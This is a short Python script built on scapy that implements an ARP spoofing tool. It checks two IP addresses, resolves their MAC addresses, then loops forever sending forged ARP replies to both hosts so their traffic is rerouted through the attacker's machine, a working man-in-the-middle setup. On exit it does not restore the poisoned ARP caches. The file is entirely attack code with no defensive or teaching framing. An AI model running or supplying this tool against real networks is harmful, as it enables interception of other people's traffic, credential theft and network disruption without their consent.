import scapy.all as scapy
import sys, time, ipaddress, termcolor

class ARPSpoofer:

    def __init__(self, target, spoof):
        self.target = target.strip()
        self.spoof = spoof.strip()

    def getMAC(self, ipAddress):
        ans, unans = scapy.arping(ipAddress, verbose=0)
        if len(ans):
            return ans[0][1].src
        else:
            print(termcolor.colored((f"[-] Unable to extract MAC address of {ipAddress}"), "red"))
            return -1

    
    def checkIP(self, ipAddress):
        try:
            ipaddress.ip_address(ipAddress)
            return True
        except Exception as e:
            print(termcolor.colored((f"[-] IP - {ipAddress} is not Valid : {e}"), "red"))
            return False
    
    def spoofer(self):
        if self.checkIP(self.target) and self.checkIP(self.spoof):
            print(termcolor.colored((f"***STARTING ARP SPOOFER***"), "blue"))
            targetMAC = self.getMAC(self.target)
            spoofMAC = self.getMAC(self.spoof)
            if targetMAC == -1 or spoofMAC==-1:
                print(termcolor.colored((f"[@] Closing ARP Spoofer"),"blue"))
                return 0
            print(termcolor.colored((f"MAC address of {self.target} : {targetMAC}"), "green"))
            print(termcolor.colored((f"MAC address of {self.spoof} : {spoofMAC}"), "green"))
            try:
                while True:
                    packet1 = scapy.ARP(op=2, hwdst=spoofMAC, pdst=self.spoof, psrc=self.target)
                    packet2 = scapy.ARP(op=2, hwdst=targetMAC, pdst=self.target, psrc=self.spoof)
                    scapy.send(packet1)
                    scapy.send(packet2)
                    time.sleep(2)
            except KeyboardInterrupt:
                print(termcolor.colored((f"[@] Closing ARP Spoofer"),"blue"))
                return 0
                

    